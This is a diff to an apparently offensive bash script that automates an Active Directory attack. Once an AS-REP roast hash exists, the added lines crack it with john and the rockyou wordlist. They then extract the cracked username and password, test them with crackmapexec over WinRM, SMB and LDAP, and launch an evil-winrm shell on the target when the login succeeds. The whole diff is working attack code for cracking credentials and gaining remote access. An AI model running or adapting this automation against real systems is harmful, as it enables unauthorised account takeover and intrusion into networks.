@@ -94,7 +94,30 @@ if [ -n "$check_users" ];then
 	confirm=$(ls | grep hash.asproast)
 	if [ "$confirm" = "hash.asproast" ];then
 		echo -e "${GREEN}[+] ASP_REQ_ATTACK Found ( check hash ) ... be patient john is cracking the hash  of the user services ${ENDCOLOR}"
-		john hash.asproast --wordlist=/usr/share/wordlists/rockyou.txt
+		john hash.asproast --wordlist=/usr/share/wordlists/rockyou.txt > out_john
+		cat out_john | grep \$krb | cut -d" " -f 1 | uniq > pass.txt
+		cat out_john | grep \$krb | cut -d$ -f 4 | cut -d@ -f 1 | uniq  > user.txt
+
+		user=$(cat user.txt)
+		echo -e "${RED}[-] $user ${ENDCOLOR}"
+		pass=$(cat pass.txt)
+		echo -e "${RED}[-] $pass ${ENDCOLOR}"
+		if [ -n "$pass" ];then
+			mkdir cme_user
+			crackmapexec winrm $ip -u user.txt -p pass.txt --no-bruteforce --continue-on-succes > ./cme_user/winrm
+			crackmapexec smb $ip -u user.txt -p pass.txt --no-bruteforce --continue-on-succes 
+			crackmapexec ldap $ip -u user.txt -p pass.txt --no-bruteforce --continue-on-succes 
+			cat ./cme_user/winrm | grep Pwn3d! > cme_user/winrm_verif
+			checkwinrm=$(cat cme_user/winrm_verif)
+			if [ -n "$checkwinrm" ];then
+				terminator -e "evil-winrm -i $ip -u $user -p $pass"
+			else
+				echo -e "${RED}[-] No creds for winrm   ${ENDCOLOR}"
+			fi
+		else
+			echo -e "${RED}[-] No succes to crack the hash   ${ENDCOLOR}"
+		fi
+
 	else
 		echo -e "${RED}[-] No succes to ASP_REQ_ATTACK  ${ENDCOLOR}"
 	fi 
